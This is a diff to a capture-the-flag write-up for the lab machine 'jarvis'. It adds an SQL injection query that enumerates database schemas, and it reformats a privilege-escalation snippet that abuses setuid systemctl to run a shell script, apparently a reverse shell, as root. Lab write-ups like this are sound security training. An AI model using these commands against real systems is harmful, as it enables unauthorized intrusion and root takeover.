@@ -5,6 +5,7 @@
 <!-- TOC -->
 
 - [jarvis : `10.10.10.143`](#jarvis--101010143)
+  - [Enumerating database](#enumerating-database)
   - [Credentials](#credentials)
   - [Synopsis](#synopsis)
   - [Enumeration](#enumeration)
@@ -14,6 +15,12 @@
   - [Privilege Escalation](#privilege-escalation)
 
 <!-- /TOC -->
+
+## Enumerating database
+
+- Extract all database names : `SELECT group_concat(0x0a,schema_name FROM information_schema.schemata`
+
+---
 
 ## Credentials
 
@@ -79,17 +86,16 @@
 ## Privilege Escalation
 
 - `systemctl` has setuid set.
-
 - With the help of [gtfobins](https://gtfobins.github.io/gtfobins/systemctl/#suid) , got access to root.
-  
-  ```bash
-  cd /tmp
-  TF=`mktemp`.service
-  echo '[Service] 
-  Type=oneshot 
-  ExecStart=/bin/bash /dev/shm/rev 
-  [Install] 
-  WantedBy=multi-user.target' > $TF
-  /bin/systemctl link $TF
-  /bin/systemctl enable --now $TF
-  ```
+
+```bash
+cd /tmp
+TF=`mktemp`.service
+echo '[Service] 
+Type=oneshot 
+ExecStart=/bin/bash /dev/shm/rev 
+[Install] 
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
